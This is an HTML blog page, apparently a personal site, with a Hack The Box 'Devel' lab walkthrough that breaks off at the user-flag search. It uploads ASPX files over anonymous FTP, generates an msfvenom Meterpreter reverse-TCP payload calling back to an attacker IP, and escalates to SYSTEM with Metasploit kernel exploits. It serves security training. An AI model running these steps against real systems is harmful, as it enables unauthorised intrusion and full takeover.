@@ -1,0 +1,819 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>HTB DEVEL | Jenn Shagrin</title>
+<meta name="description" content="Hack The Box DEVEL: anonymous FTP upload, ASPX execution, Meterpreter foothold, and Windows privilege escalation to SYSTEM.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/htb-devel.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.40a236105b83b1f05a55d0a48876965b59b1d8f81f351041e484dc5905b375dc.css" rel="preload stylesheet" as="style">
+    <link rel="stylesheet" href="/assets/css/accents.css">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/mobile-nav.css">
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&amp;family=Source+Code+Pro:wght@400;500;600&amp;family=Tomorrow:wght@500;600;700&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/site-ui-lab.css">
+<style>
+  .htb-devel .post-content > p:first-child {
+    margin-bottom: 1.75rem;
+    padding: 0;
+    background: none;
+    border: 0;
+    border-radius: 0;
+  }
+</style>
+<meta property="og:url" content="https://jennshaggy.github.io/htb-devel.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="HTB DEVEL">
+<meta property="og:description" content="Hack The Box DEVEL: anonymous FTP upload, ASPX execution, Meterpreter foothold, and Windows privilege escalation to SYSTEM.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HTB DEVEL">
+<meta name="twitter:description" content="Hack The Box DEVEL: anonymous FTP upload, ASPX execution, Meterpreter foothold, and Windows privilege escalation to SYSTEM.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <button id="menu-toggle" type="button" aria-expanded="false" aria-controls="menu"><span class="menu-toggle-label">Menu</span><span class="menu-toggle-icon" aria-hidden="true"><span></span><span></span></span></button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/penetration-testing.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="/ai-security/" title="AI Security">
+                    <span>AI Security</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single technical-writeup htb-devel">
+<header class="post-header">
+<h1 class="post-title entry-hint-parent">HTB DEVEL</h1>
+<div class="post-description">Hack The Box challenge: anonymous FTP to ASPX execution, Meterpreter, and SYSTEM.</div>
+</header>
+<div class="post-content">
+<p>If you've landed on my little corner of the internet before, I'd normally place an informational segue into the room here.</p>
+
+<p>Today is not that day.</p>
+
+<p>Devel is a HTB challenge TCM Security uses for PNPT cert exam prep. That means we're flying in blind, but not unequipped.</p>
+
+<p>Tasked with the challenge of achieving User privs before consulting any PNPT course content, I took the opportunity to see just how far I could get on my own.</p>
+
+<p>Let the fun begin.</p>
+
+<p>We'll start off with two terminal windows: one running an Nmap scan of the Target IP, and one Rustscan (that still passes off to Nmap, but a bit faster) running to assess our open ports and services.</p>
+
+<p>If you'd like to set your Target IP as a variable, do so in each terminal window you open as you go along:</p>
+
+<pre><code>tip=10.129.77.223
+echo $tip</code></pre>
+
+<p>First, our Nmap syntax. This will scan for open ports, script vulnerabilities, and a bunch of other useful information:</p>
+
+<pre><code>nmap -sS -Pn -sC -sV --script=vuln -T4 -A $tip -oN DEVEL_nmap_result</code></pre>
+
+<p>Now our more efficient Rustscan:</p>
+
+<pre><code>sudo rustscan -a $tip -b 5000 -r 1-65535 --exclude-ports 9999 -- -A -n -T4 --max-retries 1 --min-rate 1000 -oA DEVEL_rust_scan</code></pre>
+
+<p>I'm piping the output for both into three formats. Likely overkill for a challenge, but practicing professional habits at all times only helps solidify them.</p>
+
+<p>Here's a solid and much easier to remember Rustscan syntax for challenge environments:</p>
+
+<pre><code>rustscan -a $tip -- -A</code></pre>
+
+<p>It's a great scan that shows you all open ports via Rustscan, which then hands it over to Nmap to enumerate everything running on those ports. Seeing the running services can help you assess the type of environment (example: AD or AD CS), if vulnerable services are running, etc.</p>
+
+<p>Rustscan comes back first with very similar information to what we'll eventually see Nmap return:</p>
+
+<img src="/images/htb-devel/shot-000.png" alt="Screenshot 2026-10-08 at 6.30.37 AM.png" loading="lazy">
+
+<img src="/images/htb-devel/shot-001.png" alt="Screenshot 2026-10-08 at 6.31.16 AM.png" loading="lazy">
+
+<p>Well, well. We have an anonymous FTP server running on Port 21. This challenge is marked as Easy, so we'll keep this in our back pocket as the likely path to initial access.</p>
+
+<p>We also have Port 80 communicating through Windows Server. Also duly noted.</p>
+
+<p>We have questions to answer along the path. Before diving in deeper, we'll pay attention to them.</p>
+
+<p>Let's review the Nmap scan results. No, running both wasn't fully necessary. If your brain is any bit like mine, you want information in several formats. Rustscan comes back quickly, Nmap comes back cautiously and with gusto:</p>
+
+<img src="/images/htb-devel/shot-002.png" alt="Screenshot 2026-10-08 at 6.37.11 AM.png" loading="lazy">
+
+<img src="/images/htb-devel/shot-003.png" alt="Screenshot 2026-10-08 at 6.37.38 AM.png" loading="lazy">
+
+<p>As you can see, the more detailed Nmap is worth waiting for because it holds the answer to our first question.</p>
+
+<p><strong>What is the name of the service running on TCP port 21 on the target machine?</strong> <code>Microsoft ftpd</code></p>
+
+<img src="/images/htb-devel/shot-004.png" alt="Screenshot 2026-10-08 at 6.39.09 AM.png" loading="lazy">
+
+<p>This also helps validate intuitions about the initial access path.</p>
+
+<p>The next question doesn't require any recon or enum to answer. It does require some basic knowledge of FTP commands. Thankfully, I coded in an era where FTP was a perfectly viable way to upload content while building a website.</p>
+
+<p><strong>Which basic FTP command can be used to upload a single file onto the server?</strong> <code>put</code></p>
+
+<img src="/images/htb-devel/shot-005.png" alt="Screenshot 2026-10-08 at 6.43.35 AM.png" loading="lazy">
+
+<p>Interactive FTP commands are literal, which my neurospicy brain appreciates.</p>
+
+<p>The next flag question wants us to enumerate the anonymous FTP service, so we'll do just that.</p>
+
+<p>If FTP is running on Port 21 like it is here, here's how you connect:</p>
+
+<pre><code>ftp $tip</code></pre>
+
+<p>Since it's an Anonymous FTP service, the credentials are <code>Anonymous:&lt;leave blank/hit Enter</code>&gt;:</p>
+
+<img src="/images/htb-devel/shot-006.png" alt="Screenshot 2026-10-08 at 6.47.01 AM.png" loading="lazy">
+
+<p>Let's see what's hiding on here:</p>
+
+<pre><code>ls</code></pre>
+
+<img src="/images/htb-devel/shot-007.png" alt="Screenshot 2026-10-08 at 6.48.39 AM.png" loading="lazy">
+
+<p>The question wants to know if any files are on the FTP root, so let's find out where we are:</p>
+
+<pre><code>pwd</code></pre>
+
+<img src="/images/htb-devel/shot-008.png" alt="Screenshot 2026-10-08 at 6.50.35 AM.png" loading="lazy">
+
+<p>Now we can answer our next question with conviction.</p>
+
+<p><strong>Are files put into the FTP root available via the webserver?</strong> yes</p>
+
+<img src="/images/htb-devel/shot-009.png" alt="Screenshot 2026-10-08 at 6.51.51 AM.png" loading="lazy">
+
+<p>The next question works as a strong hint.</p>
+
+<p>Let's grab both files with extensions and do some quick static analysis:</p>
+
+<pre><code>get iisstart.htm
+get welcome.png</code></pre>
+
+<img src="/images/htb-devel/shot-010.png" alt="Screenshot 2026-10-08 at 6.58.47 AM.png" loading="lazy">
+
+<p>Now that we have both, we'll investigate them on our local machine. Since we can come back to this wide open FTP server any time, sign off with:</p>
+
+<pre><code>bye</code></pre>
+
+<p>Now we'll take a closer look at what we have:</p>
+
+<pre><code>file iisstart.htm welcome.png</code></pre>
+
+<img src="/images/htb-devel/shot-011.png" alt="Screenshot 2026-10-08 at 7.00.37 AM.png" loading="lazy">
+
+<p>Okay. Basic information. Let's get a bit more detailed with each one:</p>
+
+<pre><code>xxd -l 16 welcome.png</code></pre>
+
+<p>The first command will help us identify if the PNG is, in fact, a PNG aka does it have the hex markers of a PNG file:</p>
+
+<img src="/images/htb-devel/shot-012.png" alt="Screenshot 2026-10-08 at 7.03.14 AM.png" loading="lazy">
+
+<p>Hmm. This is deceptive. The <code>0d</code> byte is missing. True PNGs should come back with this byte sequence: <code>89 50 4e 47 0d 0a 1a 0a</code>.</p>
+
+<p>Let's look a little deeper:</p>
+
+<pre><code>xxd -g 1 -l 24 welcome.png</code></pre>
+
+<img src="/images/htb-devel/shot-013.png" alt="Screenshot 2026-10-08 at 7.09.06 AM.png" loading="lazy">
+
+<p>Aha. FTP downloaded the PNG in ASCII mode, which probably ate its <code>0d</code> (carriage return) bytes. We'll go back and grab it.</p>
+
+<p>First, let's confirm that we don't need to redownload the <code>.htm</code> file:</p>
+
+<pre><code>sed -n &#x27;1,80p&#x27; iisstart.htm</code></pre>
+
+<img src="/images/htb-devel/shot-014.png" alt="Screenshot 2026-10-08 at 7.04.52 AM.png" loading="lazy">
+
+<pre><code>ftp $tip
+binary
+status
+get welcome.png welcome-verified.png
+bye</code></pre>
+
+<img src="/images/htb-devel/shot-015.png" alt="Screenshot 2026-10-08 at 7.17.09 AM.png" loading="lazy">
+
+<p>That took a little longer than I'd expect a single PNG file to need.</p>
+
+<p>Back on our local machine:</p>
+
+<pre><code>stat -c &#x27;%n %s bytes&#x27; welcome*.png
+xxd -g 1 -l 8 welcome-verified.png</code></pre>
+
+<img src="/images/htb-devel/shot-016.png" alt="Screenshot 2026-10-08 at 7.18.30 AM.png" loading="lazy">
+
+<p>Just a regular PNG. Using <code>binary</code> resuscitated the missing <code>0d</code> byte.</p>
+
+<p>Let's check the response headers:</p>
+
+<pre><code>curl -I http://$tip/</code></pre>
+
+<img src="/images/htb-devel/shot-017.png" alt="Screenshot 2026-10-08 at 7.22.41 AM.png" loading="lazy">
+
+<p>There's our answer.</p>
+
+<p><strong>What file extension is executed as a script on this webserver? Don't include the <code>.</code>.</strong></p>
+
+<img src="/images/htb-devel/shot-018.png" alt="Screenshot 2026-10-08 at 7.23.14 AM.png" loading="lazy">
+
+<p>ASP.NET is enabled on the Microsoft server. <code>X-Powered-By: ASP.NET</code> means <code>.aspx</code> is executed by IIS.</p>
+
+<p>The next question wants us to identify which metasploit recon module is best used to PrivEsc on a compromised system.</p>
+
+<p>Using what we know, let's fire up metasploit and find out:</p>
+
+<pre><code>msfconsole</code></pre>
+
+<p>I know it seems like we skipped a step here, but we don't actually have to identify the vulnerable service we're exploiting to identify the answer to the next question.</p>
+
+<p>The question asks us what will run "on a compromised system", which likely means we need to search metasploit for:</p>
+
+<pre><code>search type:post local</code></pre>
+
+<img src="/images/htb-devel/shot-019.png" alt="Screenshot 2026-10-08 at 7.53.33 AM.png" loading="lazy">
+
+<p>Row 33 is looking the most promising with its mentions of "recon" and "suggest possible paths."</p>
+
+<p>Let's see if we're right:</p>
+
+<pre><code>info 33</code></pre>
+
+<img src="/images/htb-devel/shot-020.png" alt="Screenshot 2026-10-08 at 7.55.49 AM.png" loading="lazy">
+
+<p>Music to my ears. This sounds like exactly what we're looking for. It suggests local exploits, and it runs on a compromised system using <code>SESSION</code>.</p>
+
+<p><strong>Which metasploit reconnaissance module can be used to list possible privilege escalation paths on a compromised system?</strong></p>
+
+<img src="/images/htb-devel/shot-021.png" alt="Screenshot 2026-10-08 at 7.57.50 AM.png" loading="lazy">
+
+<p>Now that we know we have the correct metasploit recon module, we're left to find our way to the user and root flags by way of using it.</p>
+
+<p>FYI: My hotel Wi-Fi was utter crap. I redid the search after finally establishing a new connection and added a space by accident, but it did create a convenient visual opp:</p>
+
+<img src="/images/htb-devel/shot-022.png" alt="Screenshot 2026-10-09 at 8.02.59 AM.png" loading="lazy">
+
+<p>Alright. Let's see what this module needs from us.</p>
+
+<pre><code>sessions</code></pre>
+
+<img src="/images/htb-devel/shot-023.png" alt="Screenshot 2026-10-20 at 8.06.34 AM.png" loading="lazy">
+
+<p>Small hiccup here. There are no active sessions, and we will likely need an active session to grab an initial foothold.</p>
+
+<p>Reflecting back on our port scan, FTP seems to be our most viable way in.</p>
+
+<p>Back to FTP:</p>
+
+<pre><code>printf &#x27;devel-test\n&#x27; &gt; devel-test.txt
+ftp &quot;$tip&quot;</code></pre>
+
+<p>Enter <code>Anonymous</code>, then hit the <code>Enter</code> key at the password prompt.</p>
+
+<img src="/images/htb-devel/shot-024.png" alt="Screenshot 2026-10-09 at 8.22.49 AM.png" loading="lazy">
+
+<p>We meet again, <code>ftp</code>.</p>
+
+<pre><code>put devel-test.txt
+bye</code></pre>
+
+<img src="/images/htb-devel/shot-025.png" alt="Screenshot 2026-10-09 at 8.25.06 AM.png" loading="lazy">
+
+<p>So formal and polite.</p>
+
+<p>Back at our regular prompt:</p>
+
+<pre><code>curl &quot;http://$tip/devel-test.txt&quot;</code></pre>
+
+<img src="/images/htb-devel/shot-026.png" alt="Screenshot 2026-10-09 at 8.25.56 AM.png" loading="lazy">
+
+<p>It's now time to connect the dots around what we know.</p>
+
+<p>We have a server running IIS. IIS runs <code>.aspx</code> files as server-side code. Fortunately for us, anonymous FTP lets us write files to the directory served by IIS. The <code>.aspx</code> file we upload <em>might</em> run when we request it to.</p>
+
+<p>IIS and ASP.NET aren't inherently vulnerable services, but the perfect storm lay in the flaw of untrusted write access to executable web content.</p>
+
+<p>By "<em>might</em> run," I mean we have to test if the conditions are favorable. Let's see if it will execute <code>.aspx</code>:</p>
+
+<pre><code>printf &#x27;%s\n&#x27; &#x27;&lt;%@ Page Language=&quot;C#&quot; %&gt;&lt;% Response.Write(&quot;aspx-ran&quot;); %&gt;&#x27; &gt; probe.aspx
+ftp &quot;$tip&quot;</code></pre>
+
+<p>Now back to our <code>ftp</code> portal:</p>
+
+<pre><code>ftp $tip
+#Enter Anonymous for the username, click Enter at the password prompt.
+put probe.aspx
+bye</code></pre>
+
+<img src="/images/htb-devel/shot-027.png" alt="Screenshot 2026-10-09 at 8.36.53 AM.png" loading="lazy">
+
+<p>Back at our terminal prompt:</p>
+
+<pre><code>curl -i &quot;http://$tip/probe.aspx&quot;</code></pre>
+
+<p>I mentally picture this like throwing a lasso that you laid upon the ground and then pulled as hard as you can when someone stepped in the center.</p>
+
+<img src="/images/htb-devel/shot-028.png" alt="Screenshot 2026-10-09 at 8.37.34 AM.png" loading="lazy">
+
+<p>We put the code there. It ran. By logical deduction, someone has the rights to execute that code. We just have no idea who (yet).</p>
+
+<p>That's what we need to know next.</p>
+
+<p>Open <code>probe.aspx</code>, and replace the body with this snippet:</p>
+
+<pre><code>nano probe.aspx
+&lt;%@ Page Language=&quot;C#&quot; %&gt;&lt;% Response.Write(System.Security.Principal.WindowsIdentity.GetCurrent().Name); %&gt;</code></pre>
+
+<p>As you can see, we've created a tiny C# program to execute:</p>
+
+<img src="/images/htb-devel/shot-029.png" alt="Screenshot 2026-10-09 at 8.47.40 AM.png" loading="lazy">
+
+<p>Save and exit with <code>CTRL</code> + <code>O</code> and <code>CTRL</code> + <code>X</code> .</p>
+
+<p>Once again, we're going to upload <code>probe.aspx</code> and run it:</p>
+
+<pre><code>ftp $tip
+#Enter Anonymous for the username, click Enter at the password prompt.
+put probe.aspx
+bye</code></pre>
+
+<p>And request it again:</p>
+
+<pre><code>curl -i &quot;http://$tip/probe.aspx&quot;</code></pre>
+
+<img src="/images/htb-devel/shot-030.png" alt="Screenshot 2026-10-09 at 8.49.03 AM.png" loading="lazy">
+
+<p>(Laughs in evil hacker) It worked. Excellent. We have evidence that the server will execute ASPX code.</p>
+
+<p>To set up our shell, we need a callback address on our Kali VM that the target can reach. Think "ET Phone Home", but ET needs the number:</p>
+
+<pre><code>ip -br addr show tun0</code></pre>
+
+<p>Take note of the IP you get back. That's what you'll set as the <code>LHOST</code> in <code>msfconsole</code>.</p>
+
+<p>As I mentioned earlier, there's no active session in <code>local_exploit_suggester</code>. That means we need to pivot to a different <code>metasploit</code> module that allows our uploaded ASPX code to establish a session.</p>
+
+<p>Let's open <code>msfconsole</code> back up and prep the listener:</p>
+
+<pre><code>msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.10.14.123
+show options</code></pre>
+
+<p><code>show options</code> will reveal what we're missing to successfully run the exploit and achieve the shell.</p>
+
+<img src="/images/htb-devel/shot-031.png" alt="Screenshot 2026-10-09 at 8.56.16 AM.png" loading="lazy">
+
+<p>Everything required to run this exploit is already in place. Kali will listen on <code>Port 4444</code> as evidenced by <code>LPORT 4444</code>.</p>
+
+<p>Now we start it in the background...</p>
+
+<pre><code>run -j</code></pre>
+
+<img src="/images/htb-devel/shot-032.png" alt="Screenshot 2026-10-09 at 8.59.30 AM.png" loading="lazy">
+
+<p>...and the listener is alive and ready. <code>Started reverse TCP handler on &lt;YOUR_CALLBACK_IP&gt;:4444</code> is your confirmation.</p>
+
+<p>Now we open a new Kali terminal and create a new <code>.aspx</code> file that matches what the listener needs: same payload, IP, and port on both the listener and local sides.</p>
+
+<p>This will create <code>foothold.aspx</code> using the same payload, address, and port as our listener:</p>
+
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.123 LPORT=4444 -f aspx -o foothold.aspx</code></pre>
+
+<img src="/images/htb-devel/shot-033.png" alt="Screenshot 2026-10-09 at 9.05.21 AM.png" loading="lazy">
+
+<p>Success.</p>
+
+<p>We're going to repeat the same process as we did with <code>probe.aspx</code> with our new <code>foothold.aspx</code>, but we don't need the initial testing phase. We know it'll execute.</p>
+
+<p>Re-set your target IP as a variable with <code>tip=TARGET_IP</code>, then:</p>
+
+<pre><code>ftp $tip
+put foothold.aspx
+bye</code></pre>
+
+<img src="/images/htb-devel/shot-034.png" alt="Screenshot 2026-10-09 at 9.08.25 AM.png" loading="lazy">
+
+<p>Now we request our freshly planted <code>.aspx</code> with curl, and turn our eyes back to the metasploit listener:</p>
+
+<pre><code>curl -i &quot;http://$tip/foothold.aspx&quot;</code></pre>
+
+<img src="/images/htb-devel/shot-035.png" alt="Screenshot 2026-10-09 at 9.10.29 AM.png" loading="lazy">
+
+<p>Aha! We got it. <code>Meterpreter session 1 opened</code>.</p>
+
+<p>I know it doesn't look like we have a prompt to type at in <code>msfconsole</code> because we backgrounded it with <code>run -j</code>, but type this and trust me a bit:</p>
+
+<pre><code>sessions -i 1</code></pre>
+
+<p>Then...</p>
+
+<pre><code>getuid</code></pre>
+
+<img src="/images/htb-devel/shot-036.png" alt="Screenshot 2026-10-09 at 9.13.22 AM.png" loading="lazy">
+
+<p>We can officially confirm we're running as <code>IIS APPPOOL\Web</code>.</p>
+
+<p>Now that we have the missing session open, we can pivot back to <code>local_exploit_suggester</code>. It's a recon module that uses an existing shell or Meterpreter session to assess local exploits that might work.</p>
+
+<p>The active shell, aka <code>SESSION</code>, allows it to do its job properly.</p>
+
+<p>Still at our <code>meterpreter</code> prompt:</p>
+
+<pre><code>background
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run</code></pre>
+
+<p>We set session 1 as <code>IIS APPPOOL\Web</code>, and now the module can inspect that contextually. And it's off to work:</p>
+
+<img src="/images/htb-devel/shot-037.png" alt="Screenshot 2026-10-20 at 8.30.49 AM.png" loading="lazy">
+
+<p>Let it finish checking for workable exploits. This module performs due diligence.</p>
+
+<img src="/images/htb-devel/shot-038.png" alt="Screenshot 2026-10-20 at 8.33.14 AM.png" loading="lazy">
+
+<p>Since the results show <code>Post interrupted by the console user</code> (I did no such thing, but that's okay) and it didn't finish all 243 potential exploit investigations, let's gather intel on the Windows build and our session privileges to make sure we're in good shape:</p>
+
+<pre><code>sessions -i 1
+sysinfo
+getprivs</code></pre>
+
+<img src="/images/htb-devel/shot-039.png" alt="Screenshot 2026-10-20 at 8.37.20 AM.png" loading="lazy">
+
+<p>The most important takeaways from our new intel are <code>Windows 7 build 7600</code>, <code>x86</code>, and <code>SeImpersonatePrivilege</code>.</p>
+
+<p>We'll investigate the suggester's impersonation recommendations to see if any fit this specific situation.</p>
+
+<p>I started with <code>ms16_075_reflection</code>. It didn't get us to SYSTEM, but here's the logic behind trying it:</p>
+
+<p>1.  <code>getprivs</code> showed us <code>SeImpersonatePrivilege</code>. That means we want to lead with “investigate token impersonation.”</p>
+
+<p>2. You can run <code>search impersonate</code> in <code>msfconsole</code> and run <code>info</code> to read about the applicable results.</p>
+
+<p>3. Cross compare each result with what you concretely know: Windows 7 x86, an IIS service account, and a live session.</p>
+
+<p>Still at the <code>meterpreter</code> prompt:</p>
+
+<pre><code>background
+info exploit/windows/local/ms16_075_reflection</code></pre>
+
+<p>We don't know that we've picked the right suggestion yet. Let's see if we're on the right track:</p>
+
+<pre><code>use exploit/windows/local/ms16_075_reflection
+set SESSION 1
+check</code></pre>
+
+<img src="/images/htb-devel/shot-040.png" alt="Screenshot 2026-10-20 at 8.53.06 AM.png" loading="lazy">
+
+<p>Well, we lost our first <code>SESSION</code> set by the ASPX payload.</p>
+
+<p>We'll run this at the <code>msf exploit</code> prompt, and if it comes back empty, we'll restart our listener:</p>
+
+<pre><code>jobs</code></pre>
+
+<img src="/images/htb-devel/shot-041.png" alt="Screenshot 2026-10-20 at 8.54.52 AM.png" loading="lazy">
+
+<p>Time to restart our listener.</p>
+
+<p>We'll fortify our listener a little better this time by setting it to listen for reconnects:</p>
+
+<pre><code>use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.10.14.123
+set LPORT 4444
+set ExitOnSession false
+run -j</code></pre>
+
+<img src="/images/htb-devel/shot-042.png" alt="Screenshot 2026-10-20 at 8.58.59 AM.png" loading="lazy">
+
+<p>Almost there. From a separate Kali terminal, ideally the same separate terminal you used to trigger the previous shell (aka make sure your <code>tip</code> variable is set), run this bad boy:</p>
+
+<pre><code>curl &quot;http://$tip/foothold.aspx&quot;</code></pre>
+
+<img src="/images/htb-devel/shot-043.png" alt="Screenshot 2026-10-20 at 9.00.39 AM.png" loading="lazy">
+
+<p>Back in <code>msfconsole</code>, type <code>sessions</code> and hit enter:</p>
+
+<img src="/images/htb-devel/shot-044.png" alt="Screenshot 2026-10-20 at 9.01.40 AM.png" loading="lazy">
+
+<p>Session 2 is live and as <code>IIS APPPOOL\Web</code>. Let's see if we can verify a second session using our exploit of choice:</p>
+
+<pre><code>use exploit/windows/local/ms16_075_reflection
+set SESSION 2
+check</code></pre>
+
+<p>I'll take it. Not a guarantee, but pretty darn close:</p>
+
+<img src="/images/htb-devel/shot-045.png" alt="Screenshot 2026-10-20 at 9.03.38 AM.png" loading="lazy">
+
+<p>Let's make sure we've set everything this potentially winning exploit needs to run:</p>
+
+<pre><code>show options</code></pre>
+
+<img src="/images/htb-devel/shot-046.png" alt="Screenshot 2026-10-20 at 9.04.54 AM.png" loading="lazy">
+
+<p>Glad we ran this. It may not apply to your specific situation, but I need to change my <code>LHOST</code> (the IP where the target reached me), and Port 4444 is already busy hosting the shell in Session 1.</p>
+
+<pre><code>set LHOST 10.10.14.123
+set LPORT 4445
+show options</code></pre>
+
+<img src="/images/htb-devel/shot-047.png" alt="Screenshot 2026-10-20 at 9.07.15 AM.png" loading="lazy">
+
+<p>We're going to type <code>run</code> next. We don't know if we'll be given a shell or a system token, but we'll take it one step at a time:</p>
+
+<pre><code>run</code></pre>
+
+<img src="/images/htb-devel/shot-048.png" alt="Screenshot 2026-10-20 at 9.09.23 AM.png" loading="lazy">
+
+<p>This has very morose vibes with its "`wait for (hopefully privileged) payload execution".</p>
+
+<p>Maybe the trick to this session successfully establishing is managed expectations. At least it's refreshingly honest, and we have our shell:</p>
+
+<pre><code>getuid</code></pre>
+
+<img src="/images/htb-devel/shot-049.png" alt="Screenshot 2026-10-20 at 9.12.07 AM.png" loading="lazy">
+
+<p>We were cautioned that we could obtain a privileged token without fully changing the session's identity.</p>
+
+<p>Let's find out:</p>
+
+<pre><code>load incognito
+list_tokens -u</code></pre>
+
+<img src="/images/htb-devel/shot-050.png" alt="Screenshot 2026-10-20 at 9.13.58 AM.png" loading="lazy">
+
+<p>Well, not great news. Session 3 doesn't have a privileged token available, and we just learned we don't have a session to impersonate.</p>
+
+<p>Back to the exploit suggestions list:</p>
+
+<pre><code>info exploit/windows/local/ms10_015_kitrap0d</code></pre>
+
+<p>This one looks like a strong fit:</p>
+
+<img src="/images/htb-devel/shot-051.png" alt="Screenshot 2026-10-20 at 9.16.54 AM.png" loading="lazy">
+
+<p>We're at the <code>meterpreter</code> prompt, so let's get back to <code>msfconsole</code> and start cooking:</p>
+
+<pre><code>background
+use exploit/windows/local/ms10_015_kitrap0d
+set SESSION 3
+check</code></pre>
+
+<img src="/images/htb-devel/shot-052.png" alt="Screenshot 2026-10-20 at 9.18.17 AM.png" loading="lazy">
+
+<p>Not the most validating verification. The service was found, but it did not validate the vulnerability.</p>
+
+<p>We'll see:</p>
+
+<pre><code>show options</code></pre>
+
+<img src="/images/htb-devel/shot-053.png" alt="Screenshot 2026-10-20 at 9.19.42 AM.png" loading="lazy">
+
+<p>Let's make the necessary changes and run it:</p>
+
+<pre><code>set LHOST 10.10.14.123
+set LPORT 4446
+run</code></pre>
+
+<p>This is a kernel exploit with an inconclusive verification, so it could either fail or destabilize our challenge's box.</p>
+
+<img src="/images/htb-devel/shot-054.png" alt="Screenshot 2026-10-20 at 9.22.06 AM.png" loading="lazy">
+
+<p>It landed, but killed our Session 2 in the process. Let's run this anyways:</p>
+
+<pre><code>getuid</code></pre>
+
+<img src="/images/htb-devel/shot-055.png" alt="Screenshot 2026-10-20 at 9.23.09 AM.png" loading="lazy">
+
+<p>Well alright then! We are <code>NT AUTHORITY\SYSTEM</code>. Privilege escalation has been achieved. Let's find the <code>user</code> flag:</p>
+
+<pre><code>shell
+dir C:\Users</code></pre>
+
+<img src="/images/htb-devel/shot-056.png" alt="Screenshot 2026-10-20 at 9.24.56 AM.png" loading="lazy">
+
+<p><code>babis</code> looks like our human user profile. Let's see where <code>babis</code> takes us:</p>
+
+<pre><code>dir C:\Users\babis\Desktop</code></pre>
+
